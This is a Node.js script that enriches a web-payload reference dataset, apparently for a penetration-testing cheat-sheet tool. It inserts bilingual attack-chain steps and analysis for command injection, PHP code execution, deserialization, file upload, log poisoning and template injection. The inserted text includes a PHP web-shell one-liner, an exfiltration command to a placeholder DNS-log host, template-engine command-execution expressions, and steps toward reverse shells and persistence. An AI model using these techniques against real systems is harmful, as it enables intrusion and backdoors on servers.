import { readFileSync, writeFileSync } from 'fs';

const fp = 'src/data/webPayloads.ts';
let c = readFileSync(fp, 'utf8');
let ok = 0;

// Insert text BEFORE a specific marker string (finds first occurrence)
function insertBefore(marker, text) {
  const idx = c.indexOf(marker);
  if (idx < 0) { console.log('  NOT FOUND:', marker.slice(0,60)); return false; }
  c = c.slice(0, idx) + text + c.slice(idx);
  return true;
}

// Build an attackChain array string
function ac(...steps) {
  return '    attackChain: [\n' + steps.map(s =>
    `      { title: { zh: '${s[0]}', en: '${s[1]}' }, description: { zh: '${s[2]}', en: '${s[3]}' } },`
  ).join('\n') + '\n    ],\n';
}

// Build an analysis object string
function an(zh, en) {
  return `    analysis: { zh: '${zh.replace(/'/g,"\\'")}', en: '${en.replace(/'/g,"\\'")}' },\n`;
}

// Build references array string
function ref(...urls) {
  return '    references: [\n' + urls.map(u => `      '${u}',`).join('\n') + '\n    ],\n';
}

// ======================== RCE PAYLOADS ========================
console.log('=== RCE ===');

const rceData = {
  'rce-command-injection': {
    ac: [
      ['识别注入点','Identify injection point','通过参数探测定位接受系统命令的入口，确认分隔符(;|&)是否被过滤。','Locate entry points accepting system commands and confirm which separators are filtered.'],
      ['基础命令探测','Basic command probe','使用 ;id、|whoami 等基础命令测试，通过响应差异或时间延迟判断注入是否存在。','Test with basic commands; judge via response differences or time delays.'],
      ['WAF绕过','WAF bypass','当基础payload被拦截时尝试换行符(%0a)、IFS替代空格、Base64编码($(base64 -d))和反引号绕过。','When blocked, try newline injection, IFS alternatives, base64-encoded execution, and backtick bypass.'],
      ['建立反向Shell','Establish reverse shell','确认注入后使用bash/python/powershell反向shell获取交互式会话。','After confirming injection, establish an interactive session using language-appropriate reverse shells.'],
      ['后渗透与持久化','Post-exploitation','获取shell后收集内网信息、提取凭据、建立持久化(Crontab/SSH key)。','Collect internal info, extract credentials, establish persistence (crontab/SSH keys).'],
    ],
    an: ['命令注入是最直接的RCE形式-用户输入进入system/exec/popen等函数时发生。攻击面包括管道、重定向、命令分隔符(;|&)、内联执行($()和反引号)和通配符注入。盲注场景依赖时间延迟或DNS外带确认。','Command injection is the most direct RCE form. Attack surface includes pipes, redirects, separators, inline execution, and wildcards. Blind scenarios rely on time delays or DNS out-of-band.'],
    ref: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection'],
  },
  'rce-php': {
    ac: [
      ['定位代码执行入口','Locate code execution entry','通过调试和审计定位eval/assert/preg_replace等危险函数，确认用户输入可达。','Locate dangerous function call sites; confirm user input reaches these functions.'],
      ['注入PHP一句话','Inject PHP one-liner','使用<?php system($_GET["cmd"]);?>获取命令执行。通过注释分割、回调函数、Base64解码绕过检测。','Use PHP one-liners for command execution; bypass detection via comment splitting, callbacks, and Base64.'],
      ['绕过disable_functions','Bypass disable_functions','当system/exec被禁用时利用LD_PRELOAD劫持、FFI::cdef、IMAP open绕过等方式突破。','When system/exec are disabled, bypass via LD_PRELOAD hooking, FFI::cdef, IMAP open bypass.'],
      ['建立持久化','Establish persistence','写入无字母数字shell、回调shell等变体；添加.user.ini auto_prepend_file实现无文件后门。','Write polymorphic WebShells; add .user.ini auto_prepend_file for fileless backdoors.'],
    ],
    an: ['PHP代码执行因eval/assert/preg_replace接收用户输入导致。即使disable_functions限制system/exec，仍可通过LD_PRELOAD/FFI/IMAP/GCONV突破。PHP反序列化和Phar反序列化是独立RCE向量。','PHP code execution occurs when dangerous functions receive user input. Even with disable_functions, bypasses exist via LD_PRELOAD/FFI/IMAP/GCONV. PHP and Phar deserialization are independent RCE vectors.'],
    ref: ['https://owasp.org/www-community/attacks/Code_Injection','https://book.hacktricks.wiki/en/pentesting-web/php-tricks-esp/index.html'],
  },
  'rce-php-filter': {
    ac: [
      ['确认Filter可用','Confirm filter availability','通过php://filter读取源码确认Filter可用，验证字符集转换支持。','Read source via php://filter to confirm availability and charset support.'],
      ['生成Filter Chain','Generate filter chain','使用php_filter_chain_generator根据目标PHP版本生成完整Filter Chain。','Generate a complete filter chain for the target PHP version.'],
      ['注入执行','Inject and execute','将链注入LFI参数，通过多层iconv转换逐字节拼出并执行PHP代码。','Inject the chain; PHP code is constructed and executed byte-by-byte through iconv conversion.'],
      ['验证与利用','Verify and exploit','通过cmd参数执行命令确认成功，获取反向Shell或操作文件系统。','Confirm execution via cmd parameter, obtain reverse shell or manipulate filesystem.'],
    ],
    an: ['PHP Filter Chain利用iconv字符集转换逐字节操作，在内存中拼出任意PHP代码。可绕过disable_functions和open_basedir，无需文件落地。','PHP filter chains leverage iconv conversion for byte-by-byte manipulation in memory. Bypasses disable_functions and open_basedir without file writes.'],
    ref: ['https://github.com/synacktiv/php_filter_chain_generator','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html'],
  },
  'rce-cmd-blind': {
    ac: [
      ['确认盲注场景','Confirm blind scenario','通过请求时间差异、响应长度变化判断是否存在注入点。','Judge injection via timing differences and response length changes.'],
      ['时间延迟验证','Time-based verification','使用sleep 5、ping -n 5等延迟命令通过耗时确认执行。','Use delay commands to confirm execution through request duration.'],
      ['DNS/HTTP外带','DNS/HTTP out-of-band','使用nslookup {DNSLOG}、curl {DNSLOG}/`cmd`外带执行结果。','Exfiltrate execution results via DNS or HTTP to a controlled server.'],
      ['写入WebShell','Write WebShell','确认注入后将一句话通过echo写入Web目录，再用浏览器触发。','Write a one-liner via echo to web directory and trigger via browser.'],
      ['反向连接','Reverse connection','使用bash/python/powershell反向shell获取交互终端。','Obtain interactive terminal via bash/python/powershell reverse shell.'],
    ],
    an: ['盲命令注入需通过侧信道确认：时间延迟、DNS外带、文件写入。最可靠路径是写入WebShell或建立反向Shell。','Blind command injection requires side-channel confirmation: time delays, DNS out-of-band, file writes. Most reliable path: write WebShell or establish reverse shell.'],
    ref: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection'],
  },
  'rce-deserialize': {
    ac: [
      ['识别序列化格式','Identify serialization format','通过魔术字节(Java aced0005、PHP O:N:)和Base64特征(rO0)识别序列化数据。','Identify serialized data via magic bytes and Base64 patterns.'],
      ['构造Gadget Chain','Construct gadget chain','使用ysoserial/PHPGGC根据目标框架选择可利用的Gadget Chain。','Select exploitable gadget chains based on target framework.'],
      ['触发反序列化','Trigger deserialization','将恶意序列化payload注入参数/Cookie/文件上传等入口，触发服务端执行。','Inject malicious payloads into parameters, cookies, or file uploads to trigger execution.'],
      ['绕过防护','Bypass defenses','被WAF拦截时使用编码混淆、JNDI/LDAP重定向等间接技术。','When blocked by WAF, use encoding obfuscation, JNDI/LDAP redirects, etc.'],
    ],
    an: ['不安全反序列化是OWASP Top 10高危漏洞。攻击者构造POP链触发任意方法调用实现RCE。Java/PHP/Python/.NET/Ruby各有成熟工具链。','Insecure deserialization is an OWASP Top 10 vulnerability. POP chains trigger arbitrary method calls for RCE. Mature toolchains exist for Java/PHP/Python/.NET/Ruby.'],
    ref: ['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data','https://portswigger.net/web-security/deserialization','https://github.com/frohoff/ysoserial'],
  },
  'rce-deserialize-php': {
    ac: [
      ['识别反序列化点','Identify deserialization point','在参数/Cookie/Session中搜索O:N:序列化特征，或通过phar://触发隐式反序列化。','Search for O:N: serialization patterns, or trigger implicit deserialization via phar://.'],
      ['审计Gadget','Audit gadgets','通过phpggc -l列举可利用链，选择最适配的利用路径。','List exploitable chains via phpggc -l; select the most suitable path.'],
      ['生成Payload','Generate payload','使用PHPGGC生成序列化payload注入POST/Cookie/文件上传。','Generate serialized payloads with PHPGGC and inject via POST/cookie/file upload.'],
      ['升级RCE','Escalate to RCE','触发后执行系统命令或写WebShell，常见链:Monolog/SwiftMailer/Guzzle/Laravel。','Execute system commands or write WebShell; common chains: Monolog/SwiftMailer/Guzzle/Laravel.'],
    ],
    an: ['PHP反序列化依赖魔术方法(__destruct/__wakeup/__toString)。PHPGGC覆盖Laravel/ThinkPHP/WordPress等框架。Phar://反序列化可在无unserialize()时触发。','PHP deserialization relies on magic methods. PHPGGC covers Laravel/ThinkPHP/WordPress. Phar:// triggers without unserialize().'],
    ref: ['https://github.com/ambionics/phpggc','https://portswigger.net/web-security/deserialization/exploiting'],
  },
  'rce-deserialize-java': {
    ac: [
      ['识别Java序列化','Identify Java serialization','搜索aced0005魔术字节、rO0 Base64前缀。','Search for aced0005 magic bytes and rO0 Base64 prefix.'],
      ['DNS探测','DNS probe','使用URLDNS gadget触发DNS查询确认反序列化点。','Use URLDNS gadget to trigger DNS queries confirming deserialization.'],
      ['JNDI注入','JNDI injection','结合JNDI/LDAP远程加载恶意类绕过classpath限制。','Combine with JNDI/LDAP to remotely load malicious classes.'],
      ['ysoserial利用','ysoserial exploitation','根据组件选择CommonsCollections/CommonsBeanutils/Spring/Shiro等链。','Select chains (CommonsCollections/CommonsBeanutils/Spring/Shiro) based on components.'],
    ],
    an: ['Java反序列化以aced0005为特征。ysoserial提供多条利用链。Log4Shell(CVE-2021-44228)是反序列化+JNDI组合。Fastjson/Jackson type auto-detection也可触发。','Java deserialization features aced0005. Log4Shell is deserialization+JNDI combo. Fastjson/Jackson type auto-detection can also trigger.'],
    ref: ['https://github.com/frohoff/ysoserial','https://portswigger.net/web-security/deserialization/exploiting'],
  },
  'rce-file-upload': {
    ac: [
      ['上传WebShell','Upload WebShell','将PHP/ASP/JSP一句话写入服务器，选择适合目标语言的WebShell变体。','Upload PHP/ASP/JSP one-liners; select the appropriate variant for the target.'],
      ['绕过上传限制','Bypass restrictions','通过扩展名变体、Content-Type伪造、魔术字节注入突破三层验证。','Bypass three-layer validation via extension variants, Content-Type spoofing, magic bytes.'],
      ['定位路径','Locate path','通过响应头、HTML回显、目录爆破找到上传文件URL。','Find uploaded file URL via response headers, HTML output, directory brute-force.'],
      ['触发执行','Trigger execution','通过HTTP传递cmd参数执行命令，建立反向Shell或持久化。','Execute commands via HTTP with cmd parameter; establish reverse shell or persistence.'],
    ],
    an: ['文件上传RCE是最经典Web攻击路径-写入WebShell后通过HTTP触发命令执行。PHP/ASPX/JSP/Python各有变体。成功关键:绕过扩展名/MIME/内容三层验证。','File upload RCE is the most classic web attack path. Variants exist for PHP/ASPX/JSP/Python. Success depends on bypassing extension/MIME/content validation.'],
    ref: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload','https://github.com/tennc/webshell'],
  },
  'rce-include': {
    ac: [
      ['识别包含点','Identify include point','定位?page=/file=参数，测试../和php://filter确认LFI。','Locate include parameters; test ../ and php://filter to confirm LFI.'],
      ['读取源码','Read source','通过php://filter base64读PHP源码发现凭据和注入点。','Read PHP source via php://filter base64 to discover credentials and injection points.'],
      ['升级LFI到RCE','Escalate LFI to RCE','尝试php://input、data://、日志投毒、Session包含升级为RCE。','Escalate to RCE via php://input, data://, log poisoning, session inclusion.'],
      ['持久化','Persistence','写入WebShell或修改Crontab/authorized_keys建立持久通道。','Write WebShell or modify crontab/authorized_keys for persistent access.'],
    ],
    an: ['文件包含(LFI)可升级为RCE:php://input注入、data://伪协议、日志投毒、Session包含、PHP Filter Chain。RFI直接通过HTTP/FTP加载远程代码。','LFI can escalate to RCE: php://input, data://, log poisoning, session inclusion, PHP filter chain. RFI loads remote code via HTTP/FTP.'],
    ref: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  'rce-log-poison': {
    ac: [
      ['识别日志路径','Identify log paths','确认服务器类型对应的日志路径(Apache/Nginx/SSH)。','Identify log paths based on server type (Apache/Nginx/SSH).'],
      ['注入PHP代码','Inject PHP code','在User-Agent/Referer/URL中携带<?php system($_GET["cmd"]);?>触发日志写入。','Carry PHP code in User-Agent/Referer/URL to trigger log writes.'],
      ['包含污染日志','Include poisoned log','通过LFI包含日志文件，注入的PHP代码被解析执行。','Include the log file via LFI; injected PHP code is parsed and executed.'],
      ['获取Shell','Obtain shell','执行成功后通过cmd参数获取命令执行，建立反向Shell。','After execution, pass cmd parameter for commands, establish reverse shell.'],
    ],
    an: ['日志投毒是LFI-to-RCE最高效路径。在User-Agent/Referer注入PHP代码写入日志后通过LFI包含执行。目标:Apache/Nginx访问日志、SSH auth.log、邮件日志。','Log poisoning is the most efficient LFI-to-RCE path. Inject PHP into logs via User-Agent/Referer, then include via LFI. Targets: Apache/Nginx access logs, SSH auth.log, mail logs.'],
    ref: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-log-poisoning.html'],
  },
  'rce-image': {
    ac: [
      ['制作图片马','Create image webshell','使用copy /b合成(GIF89a+PHP)或exiftool注入代码到图片元数据。','Use copy /b (GIF89a+PHP) or exiftool to inject code into image metadata.'],
      ['上传图片马','Upload image webshell','通过头像/相册上传，利用合法扩展名和魔术字节绕过内容检查。','Upload via avatar/album using legitimate extensions and magic bytes.'],
      ['LFI包含执行','LFI include execution','通过文件包含引用上传的图片马，嵌入的PHP代码被解析执行。','Reference uploaded image shell via LFI; embedded PHP code is executed.'],
      ['解析漏洞利用','Parser exploitation','配合.htaccess AddType或IIS解析漏洞使图片直接作为脚本执行。','Combine with .htaccess AddType or IIS parsing to execute images as scripts.'],
    ],
    an: ['图片马在合法图片内嵌入PHP/ASP代码绕过内容检测。制作:copy /b合成、exiftool注入、手写文件头+代码。需配合LFI或解析漏洞使图片被当作脚本执行。','Image webshells embed code within images to bypass content detection. Requires LFI or parsing vulnerabilities for execution.'],
    ref: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html'],
  },
  'rce-htaccess': {
    ac: [
      ['上传.htaccess','Upload .htaccess','通过文件上传上传恶意.htaccess，以text/plain绕过类型检查。','Upload malicious .htaccess with text/plain to bypass type checks.'],
      ['配置AddType','Configure AddType','AddType application/x-httpd-php .jpg使所有.jpg被当作PHP执行。','Use AddType to map .jpg to PHP execution.'],
      ['上传图片WebShell','Upload image WebShell','上传含PHP代码的.jpg，由于.htaccess规则被当作PHP执行。','Upload .jpg containing PHP; .htaccess rules cause PHP execution.'],
      ['.user.ini持久化','.user.ini persistence','对PHP-FPM上传.user.ini设置auto_prepend_file=shell.jpg实现无文件后门。','Upload .user.ini with auto_prepend_file=shell.jpg for fileless backdoors.'],
    ],
    an: ['.htaccess是Apache分布式配置文件，攻击者上传恶意.htaccess覆盖目录解析规则。.user.ini(PHP-FPM)通过auto_prepend_file实现无文件后门。这类攻击隐蔽持久。','.htaccess overrides Apache directory parsing. .user.ini enables fileless backdoors via auto_prepend_file. Stealthy and persistent.'],
    ref: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html','https://httpd.apache.org/docs/current/howto/htaccess.html'],
  },
};

for (const [id, data] of Object.entries(rceData)) {
  const marker = "id: '" + id + "',";
  const idx = c.indexOf(marker);
  if (idx < 0) { console.log('SKIP', id); continue; }
  // Find the tutorial for this payload
  const block = c.slice(idx, idx + 8000);
  const tutIdx = block.indexOf('    tutorial: {');
  if (tutIdx < 0) { console.log('SKIP', id, '-no tutorial'); continue; }
  const globalPos = idx + tutIdx;
  const extra = ac(...data.ac) + an(data.an[0], data.an[1]) + ref(...data.ref);
  c = c.slice(0, globalPos) + extra + c.slice(globalPos);
  console.log('DONE', id);
  ok++;
}


// ======================== SSTI PAYLOADS ========================
console.log('=== SSTI ===');

const sstiData = {
  'ssti-jinja2': [['确认Jinja2','Identify Jinja2','通过{{7*7}}、{{config}}确认模板引擎为Jinja2。','Confirm Jinja2 via probes.'],['对象遍历','Object traversal','通过__class__.__mro__.__subclasses__()链查找可利用类。','Traverse object chains to find exploitable classes.'],['构造RCE Payload','Construct RCE payload','利用找到的类构造命令执行payload。','Construct command execution payload using found classes.'],['反向Shell','Reverse shell','使用Python反向Shell通过SSTI执行获取交互终端。','Execute Python reverse shell via SSTI for interactive terminal.']],
  'ssti-freemarker': [['确认FreeMarker','Identify FreeMarker','通过${7*7}确认引擎。','Confirm via ${7*7}.'],['利用Execute类','Exploit Execute','使用<#assign ex="freemarker.template.utility.Execute"?new()>获取命令执行。','Use Execute class for command execution.'],['执行命令','Execute commands','通过${ex("id")}执行命令。','Execute via ${ex("id")}.'],['反弹Shell','Reverse shell','使用Execute执行bash/python反弹Shell。','Execute reverse shell via Execute.']],
  'ssti-velocity': [['确认Velocity','Identify Velocity','通过#set($x=7*7)$x确认。','Confirm via #set.'],['反射调用','Reflection','使用Class.forName执行Java反射获取Runtime。','Use Class.forName for Java reflection.'],['执行命令','Execute','Runtime.getRuntime().exec()执行命令。','Execute via Runtime.exec().'],['反弹Shell','Reverse shell','使用Java反向Shell或curl下载执行脚本。','Use Java reverse shell or curl download.']],
  'ssti-thymeleaf': [['确认Thymeleaf','Identify Thymeleaf','通过${7*7}确认。','Confirm via ${7*7}.'],['Spring EL','Spring EL','T()操作符调用Java静态方法获取Runtime。','T() operator calls Java static methods.'],['执行命令','Execute','T(java.lang.Runtime).getRuntime().exec("id")。','Execute via Runtime.exec().'],['反弹Shell','Reverse shell','通过Spring EL执行反向Shell或写入JSP。','Execute reverse shell via Spring EL.']],
  'ssti-smarty': [['确认Smarty','Identify Smarty','通过{7*7}确认。','Confirm via {7*7}.'],['利用PHP函数','Exploit PHP','使用{system("id")}或{php}标签执行。','Execute via {system()} or {php} tags.'],['读文件','Read files','{include file="file:///etc/passwd"}读取文件。','Read files via {include}.'],['反弹Shell','Reverse shell','通过system()执行bash/python反弹Shell。','Execute reverse shell via system().']],
  'ssti-mako': [['确认Mako','Identify Mako','通过${7*7}确认。','Confirm via ${7*7}.'],['Python执行','Python execution','<% import os %>\\n${os.system("id")}执行命令。','Execute via inline Python with os.system().'],['执行命令','Execute','os.popen()或subprocess执行并获取输出。','Execute via os.popen() or subprocess.'],['反弹Shell','Reverse shell','Python反向Shell通过SSTI执行。','Python reverse shell via SSTI.']],
  'ssti-tornado': [['确认Tornado','Identify Tornado','通过{{7*7}}确认。','Confirm via {{7*7}}.'],['Python执行','Python execution','{% import os %}{{os.system("id")}}执行。','Execute via os.system().'],['执行命令','Execute','os.popen()或subprocess执行。','Execute via os.popen() or subprocess.'],['反弹Shell','Reverse shell','Python反向Shell通过SSTI执行。','Python reverse shell via SSTI.']],
  'ssti-django': [['确认Django','Identify Django','通过{{7*7}}、{{request}}确认。','Confirm via {{7*7}}.'],['利用Django对象','Exploit Django','利用debug标签泄露信息或构造命令执行。','Exploit debug tags or construct command execution.'],['执行命令','Execute','通过对象遍历链找到可利用类后执行命令。','Execute after finding exploitable classes.'],['反弹Shell','Reverse shell','Python反向Shell执行。','Python reverse shell execution.']],
  'ssti-erb': [['确认ERB','Identify ERB','通过<%= 7*7 %>确认。','Confirm via <%= 7*7 %>.'],['Ruby执行','Ruby execution','<%= system("id") %>执行命令。','Execute via <%= system("id") %>.'],['执行命令','Execute','%x(id)/exec/IO.popen执行命令。','Execute via %x/exec/IO.popen.'],['反弹Shell','Reverse shell','Ruby反向Shell获取交互终端。','Ruby reverse shell for interactive terminal.']],
  'ssti-pug': [['确认Pug','Identify Pug','通过#{7*7}确认。','Confirm via #{7*7}.'],['Node.js执行','Node.js execution','- var x = require("child_process").execSync("id")执行。','Execute via child_process.'],['全局对象遍历','Global traversal','通过global.process.mainModule.require访问require。','Access require via global.process.']],
};

for (const [id, steps] of Object.entries(sstiData)) {
  const marker = "id: '" + id + "',";
  const idx = c.indexOf(marker);
  if (idx < 0) { console.log('SKIP', id); continue; }
  const block = c.slice(idx, idx + 5000);
  const tutIdx = block.indexOf('    tutorial: {');
  if (tutIdx < 0) { console.log('SKIP', id, '-no tutorial'); continue; }
  const globalPos = idx + tutIdx;
  const acSteps = steps.map(s => `      { title: { zh: '${s[0]}', en: '${s[1]}' }, description: { zh: '${s[2]}', en: '${s[3]}' } },`).join('\n');
  const extra = `    attackChain: [\n${acSteps}\n    ],\n` +
    `    analysis: { zh: '${id} SSTI利用模板引擎的表达式求值能力执行任意代码。根因是未对用户输入进行充分的模板沙箱隔离，允许访问危险对象和方法。', en: 'SSTI exploits template engine expression evaluation to execute arbitrary code. Root cause: insufficient sandbox isolation allowing access to dangerous objects and methods.' },\n` +
    `    references: [\n      'https://portswigger.net/web-security/server-side-template-injection',\n      'https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html',\n    ],\n`;
  c = c.slice(0, globalPos) + extra + c.slice(globalPos);
  console.log('DONE', id);
  ok++;
}

writeFileSync(fp, c, 'utf8');
console.log('\nTotal enriched:', ok);
